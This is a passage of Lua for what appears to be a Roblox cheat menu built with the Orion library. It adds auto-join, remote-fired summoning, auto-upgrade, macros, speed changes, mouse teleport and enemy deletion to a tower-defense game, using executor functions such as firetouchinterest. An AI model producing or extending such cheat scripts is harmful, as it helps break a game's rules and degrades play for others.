	Name = "Auto Support",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local UpgradeTab = Window:MakeTab({
	Name = "Auto Upgrade",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local AbilityTab = Window:MakeTab({
	Name = "Auto Ability",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local PriorityTab = Window:MakeTab({
	Name = "Auto Priority",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local LobbyTab = Window:MakeTab({
	Name = "Lobby Stuff",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local MobCounterTab = Window:MakeTab({
	Name = "Mob Count",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local MacroTab = Window:MakeTab({
	Name = "Macro",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local SettingsTab = Window:MakeTab({
	Name = "Settings",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--Toggles:

--LobbyTab

LobbyTab:AddButton({
	Name = "Force Lobby TP",
	Default = false,
	Callback = function(Value)
	    pcall(function()
        game:GetService("TeleportService"):Teleport(4996049426, LocalPlayer)
        end)
	end    
})

LobbyTab:AddButton({
	Name = "Teleport World 1",
	Default = false,
	Callback = function(Value)
	    pcall(function()
        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.World1.World1, 0)
        end)
	end    
})

LobbyTab:AddButton({
	Name = "Teleport World 2",
	Default = false,
	Callback = function(Value)
        pcall(function()
        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, game:GetService("Workspace").Queue.World2.World2, 0)
        end)
	end    
})

LobbyTab:AddDropdown({
    Name = "Banner",
    Default = "Banner X",
    Options = {"Banner X", "Banner Y", "Banner Z", "Gold Banner", "Special Banner Gohan", "Special Banner Diavolo"},
    Callback = function(Value)
    summonvalue = Value
    end
})

LobbyTab:AddButton({
	Name = "Summon 1x",
	Default = false,
	Callback = function(Value)
	    if summonvalue == "Banner X" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("SummonStart", 1)
	    end
	    if summonvalue == "Banner Y" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("SummonStart", 2)
	    end
	    if summonvalue == "Banner Z" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("SummonStart", 3)
	    end
	    if summonvalue == "Gold Banner" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("GoldSummonStart")
	    end
	    if summonvalue == "Special Banner Gohan" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("BannerSummon", 1, "GohanBeast")
	    end
	    if summonvalue == "Special Banner Diavolo" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("BannerSummon", 1, "DiavoloBanner")
	    end
	end    
})

LobbyTab:AddButton({
	Name = "Summon 10x",
	Default = false,
	Callback = function(Value)
        if summonvalue == "Banner X" then
            game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("SummonStart10", 1)
	    end
	    if summonvalue == "Banner Y" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("SummonStart10", 2)
	    end
	    if summonvalue == "Banner Z" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("SummonStart10", 3)
	    end
	    if summonvalue == "Gold Banner" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("GoldSummonStart10")
	    end
	    if summonvalue == "Special Banner Gohan" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("BannerSummon", 10, "GohanBeast")
	    end
	    if summonvalue == "Special Banner Diavolo" then
	        game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("BannerSummon", 10, "DiavoloBanner")
	    end
	end    
})

LobbyTab:AddToggle({
	Name = "Auto Join",
	Default = _G.SettingsTable.autojoin,
	Callback = function(Value)
	    _G.SettingsTable.autojoin = Value
        autojoin()
	end    
})

LobbyTab:AddDropdown({
    Name = "Auto Join Mode",
    Default = _G.SettingsTable.mode,
    Options = {"Story Mode", "Infinite Mode"},
    Callback = function(Value)
        _G.SettingsTable.mode = Value
        SaveSettings()
    end
})

LobbyTab:AddTextbox({
	Name = "Story Mode Level W1: 1-126 W2: 127-192",
	Default = _G.SettingsTable.storylevel,
	TextDisappear = false,
	Increment = 1,
	Callback = function(Value)
	    _G.SettingsTable.storylevel = Value
	    SaveSettings()
	end    
})

LobbyTab:AddDropdown({
    Name = "Infinite Mode Map",
    Default = _G.SettingsTable.inflevel,
    Options = {"Regular One Piece", "Regular Food", "Category", "Air", "Double Path", "Training Mode"},
    Callback = function(Value)
        _G.SettingsTable.inflevel = Value
        SaveSettings()
    end
})



-- PriorityTab

PriorityTab:AddToggle({
	Name = "Change Priority",
	Default = false,
	Callback = function(Value)
	    _G.priority = Value
        priority()
	end    
})

PriorityTab:AddDropdown({
	Name = "Priority",
	Default = "",
	Options = {"First", "Last", "Strongest", "Weakest", "Farthest", "Closest", "Find-Air"},
	Callback = function(Value)
		if Value == "First" then priorityvalue = 0 
		elseif Value == "Last" then priorityvalue = 1
		elseif Value == "Strongest" then priorityvalue = 2
		elseif Value == "Weakest" then priorityvalue = 3
		elseif Value == "Farthest" then priorityvalue = 4
		elseif Value == "Closest" then priorityvalue = 5
		elseif Value == "Find-Air" then priorityvalue = 6
        end
	end    
})

PriorityTab:AddToggle({
    Name = "Slot 1: "..game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.One.Unit.Value,
    Default = false,
    Callback = function(Value)
    _G.unit1 = Value
    end
})

PriorityTab:AddToggle({
    Name = "Slot 2: "..game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Two.Unit.Value,
    Default = false,
    Callback = function(Value)
    _G.unit2 = Value
    end
})

PriorityTab:AddToggle({
    Name = "Slot 3: "..game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Three.Unit.Value,
    Default = false,
    Callback = function(Value)
    _G.unit3 = Value
    end
})

PriorityTab:AddToggle({
    Name = "Slot 4: "..game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Four.Unit.Value,
    Default = false,
    Callback = function(Value)
    _G.unit4 = Value
    end
})

PriorityTab:AddToggle({
    Name = "Slot 5: "..game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Five.Unit.Value,
    Default = false,
    Callback = function(Value)
    _G.unit5 = Value
    end
})

PriorityTab:AddToggle({
    Name = "Slot 6: "..game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Six.Unit.Value,
    Default = false,
    Callback = function(Value)
    _G.unit6 = Value
    end
})

--MacroTab

MacroTab:AddToggle({
    Name = "Auto 2x",
    Default = _G.SettingsTable.auto2x,
    Callback = function(Value)
    _G.SettingsTable.auto2x = Value
    auto2x()
    end
})

MacroTab:AddToggle({
    Name = "Auto Extreme",
    Default = _G.SettingsTable.autoextreme,
    Callback = function(Value)
    _G.SettingsTable.autoextreme = Value
    autoextreme()
    end
})

MacroTab:AddToggle({
    Name = "Auto Replay",
    Default = _G.SettingsTable.autoreplay,
    Callback = function(Value)
    _G.SettingsTable.autoreplay = Value
    autoreplay()
    end
})

MacroTab:AddToggle({
    Name = "Record Macro",
    Default = false,
    Callback = function(Value)
    _G.record = Value
    record()
    end
})

MacroTab:AddToggle({
    Name = "Playback Macro",
    Default = _G.SettingsTable.autoplayback,
    Callback = function(Value)
    _G.SettingsTable.autoplayback = Value
    playback()
    end
})

MacroTab:AddDropdown({
    Name = "Saved Macros",
    Default = _G.SettingsTable.selectedmacro,
    Options = macrolist,
    Callback = function(Value)
    _G.SettingsTable.selectedmacro = Value
    SaveSettings()
    end
})

MacroTab:AddToggle({
    Name = "Auto Sell",
    Default = _G.SettingsTable.autosell,
    Callback = function(Value)
    _G.SettingsTable.autosell = Value
    autosell()
    end
})

MacroTab:AddTextbox({
	Name = "Auto Sell After Wave",
	Default = tostring(_G.SettingsTable.autosellwave),
	TextDisappear = false,
	Increment = 1,
	Callback = function(Value)
	    _G.SettingsTable.autosellwave = Value
	    SaveSettings()
	end    
})

MacroTab:AddTextbox({
    Name = "Auto Sell Speed",
    Default = _G.SettingsTable.autosellspeed,
    TextDisappear = false,
    Callback = function(Value)
        _G.SettingsTable.autosellspeed = Value
        SaveSettings()
    end
})


--SupportTab

BuffTab:AddToggle({
	Name = "Brook/Erwin",
	Default = _G.SettingsTable.autobufftoggle,
	Callback = function(Value)
        _G.SettingsTable.autobufftoggle = Value
        autobrookerwin()
	end    
})

BuffTab:AddToggle({
	Name = "Merlin",
	Default = _G.SettingsTable.automerlintoggle,
	Callback = function(Value)
        _G.SettingsTable.automerlintoggle = Value
        automerlin()
	end    
})

BuffTab:AddSection({
	Name = "  Works for 4 or 8 Brooks/Erwins, Order: 1324"
})

BuffTab:AddToggle({
	Name = "Auto FV",
	Default = _G.SettingsTable.autofv,
	Callback = function(Value)
        _G.SettingsTable.autofv = Value
        autofv()
	end    
})


--UpgradeTab

UpgradeTab:AddToggle({
	Name = "Auto Upgrade",
	Default = _G.SettingsTable.autoupgrade,
	Callback = function(Value)
        _G.SettingsTable.autoupgrade = Value
        autoupgrade()
	end    
})

UpgradeTab:AddTextbox({
	Name = "Auto Upgrade After Wave",
	Default = tostring(_G.SettingsTable.autoupgradewave),
	TextDisappear = false,
	Increment = 1,
	Callback = function(Value)
	    _G.SettingsTable.autoupgradewave = Value
	    SaveSettings()
	end    
})

UpgradeTab:AddToggle({
	Name = "Upgrade Gojo",
	Default = false,
	Callback = function(Value)
        _G.autogojo = Value
	end    
})

UpgradeTab:AddSection({
	Name = "  Fully maxes Gojo only when you place him down"
})

UpgradeTab:AddToggle({
	Name = "Upgrade Law (Upgrade 6)",
	Default = false,
	Callback = function(Value)
        _G.lawupgrade = Value
	end    
})

UpgradeTab:AddSection({
	Name = "  Upgrades Law up to Upgrade 6 only (Not Maxed)"
})

UpgradeTab:AddToggle({
	Name = "Farm Upgrade",
	Default = false,
	Callback = function(Value)
        _G.farmupgrade = Value
        farmupgrade()
	end    
})

UpgradeTab:AddSection({
	Name = "  Automatically upgrades Speedwagon and Bulma"
})

UpgradeTab:AddSection({
	Name = "  Place both farms first before starting (Made for inf runs)"
})

UpgradeTab:AddSection({
	Name = "  Prioritises Speedwagon over Bulma"
})

--AbilityTab

AbilityTab:AddToggle({
	Name = "Law Ability",
	Default = false,
	Callback = function(Value)
        _G.lawability = Value
	end    
})

AbilityTab:AddBind({
	Name = "Law Bind",
	Default = Enum.KeyCode.F1,
	Hold = false,
	Callback = function()
	    lawability()
	end    
})

AbilityTab:AddSection({
	Name = ""
})

AbilityTab:AddButton({
	Name = "Yugi 4 Cards (Auto)",
	Default = false,
	Callback = function()
        click73()
	end    
})

AbilityTab:AddToggle({
	Name = "Yugi Ability",
	Default = false,
	Callback = function(Value)
        _G.yugiability = Value
	end    
})

AbilityTab:AddBind({
	Name = "Yugi Bind",
	Default = Enum.KeyCode.F3,
	Hold = false,
	Callback = function()
	    yugiability()
	end    
})

AbilityTab:AddSection({
	Name = ""
})

AbilityTab:AddToggle({
	Name = "Light (Kira) Ability",
	Default = false,
	Callback = function(Value)
        _G.kiraability = Value
	end    
})

AbilityTab:AddBind({
	Name = "Light Bind",
	Default = "",
	Hold = false,
	Callback = function()
	    kiraability()
	end    
})

AbilityTab:AddSection({
	Name = ""
})

AbilityTab:AddToggle({
	Name = "Ryuk Ability",
	Default = false,
	Callback = function(Value)
        _G.ryukability = Value
	end    
})

AbilityTab:AddBind({
	Name = "Ryuk Bind",
	Default = "",
	Hold = false,
	Callback = function()
	    ryukability()
	end    
})

--MobCounterTab

MobCounterTab:AddButton({
	Name = "Mob Counter: 1 Time Click",
	Default = false,
	Callback = function(Value)
        _G.click69 = Value
        click69()
	end    
})

MobCounterTab:AddToggle({
	Name = "Auto Mob Notifacation",
	Default = false,
	Callback = function(Value)
        _G.mobnotifacation = Value
        mobnotifacation()
	end    
})

MobCounterTab:AddSection({
	Name = "  Loops Mobs Notifacations until you want it to stop"
})

MobCounterTab:AddSection({
	Name = ""
})

MobCounterTab:AddSection({
	Name = "  Notifacation settings below:"
})

MobCounterTab:AddSlider({
	Name = "Notifacation Interval (1-30 sec)",
	Min = 1,
	Max = 30,
	Default = 5,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	Callback = function(Value)
		mobslider = Value
	end    
})

MobCounterTab:AddSection({
	Name = "  How long you have to wait until another notifacation"
})

MobCounterTab:AddSlider({
	Name = "Notifacation Delay",
	Min = 1,
	Max = 30,
	Default = 5,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	Callback = function(Value)
		mobslider1 = Value
	end    
})

MobCounterTab:AddSection({
	Name = "  How long the notifacations will stay on the screen"
})

SettingsTab:AddButton({
	Name = "Destroy UI",
	Default = false,
	Callback = function(Value)
        _G.click70 = Value
        click70()
	end    
})

SettingsTab:AddToggle({
	Name = "Player Speed",
	Default = false,
	Callback = function(Value)
	    _G.click71 = Value
        click71()
	end    
})

SettingsTab:AddSlider({
	Name = "Speed",
	Min = 1,
	Max = 100,
	Default = 5,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	Callback = function(Value)
		TargetWalkspeed = Value
	end    
})

SettingsTab:AddToggle({
	Name = "Destroy Name (Hides Name)",
	Default = _G.SettingsTable.hidenick,
	Callback = function(Value)
	    _G.SettingsTable.hidenick = Value
	    SaveSettings()
	    if Value then
	        coroutine.resume(coroutine.create(function()
	                pcall(function()
	                    repeat wait() until #game:GetService("Workspace"):WaitForChild("Camera"):GetChildren() > 0
                        game:GetService("Workspace"):WaitForChild("Camera")[me.Name]:WaitForChild("Head"):WaitForChild("NameLevelBBGUI"):WaitForChild("LevelFrame"):WaitForChild("TextLabel"):Destroy()
                        game:GetService("Workspace"):WaitForChild("Camera")[me.Name]:WaitForChild("Head"):WaitForChild("NameLevelBBGUI"):WaitForChild("LevelFrame"):WaitForChild("ImageLabel"):Destroy()
                        game:GetService("Workspace"):WaitForChild("Camera")[me.Name]:WaitForChild("Head"):WaitForChild("NameLevelBBGUI"):WaitForChild("NameFrame"):WaitForChild("TextLabel"):Destroy()
                        game:GetService("Workspace"):WaitForChild("Camera")[me.Name]:WaitForChild("Head"):WaitForChild("NameLevelBBGUI"):WaitForChild("Top"):WaitForChild("ImageLabel"):Destroy()
	                end)
	        end))
        end
    end
})

SettingsTab:AddToggle({
	Name = "Shift-Lock",
	Default = _G.SettingsTable.shiftlock,
	Callback = function(Value)
	    _G.SettingsTable.shiftlock = Value
	    SaveSettings()
	    if Value then
            game:GetService('Players').LocalPlayer.DevEnableMouseLock = true
        else 
            game:GetService('Players').LocalPlayer.DevEnableMouseLock = false
        end
	end    
})

SettingsTab:AddToggle({
	Name = "Mouse Teleport",
	Default = false,
	Callback = function(Value)
        _G.mousetp = Value
	end    
})

SettingsTab:AddBind({
	Name = "Teleport Bind",
	Default = "",
	Hold = false,
	Callback = function()
	    mousetp()
	end    
})

SettingsTab:AddButton({
	Name = "Buff FPS (Delete Textures)",
	Default = false,
	Callback = function(Value)
local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
local g = game
local w = g.Workspace
local l = g.Lighting
local t = w.Terrain
t.WaterWaveSize = 0
t.WaterWaveSpeed = 0
t.WaterReflectance = 0
t.WaterTransparency = 0
l.GlobalShadows = false
l.FogEnd = 9e9
l.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for i, v in pairs(g:GetDescendants()) do
    if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
        v.Transparency = 1
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
        v.Lifetime = NumberRange.new(0)
    elseif v:IsA("Explosion") then
        v.BlastPressure = 1
        v.BlastRadius = 1
    elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
        v.Enabled = false
    elseif v:IsA("MeshPart") then
        v.Material = "Plastic"
        v.Reflectance = 0
        v.TextureID = 10385902758728957
    end
end
for i, e in pairs(l:GetChildren()) do
    if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
        e.Enabled = false
    end
end
	end    
})

SettingsTab:AddToggle({
	Name = "Delete Enemy (FPS)",
	Default = false,
	Callback = function(Value)
        _G.deleteenemy = Value
	end    
})

OrionLib:Init()
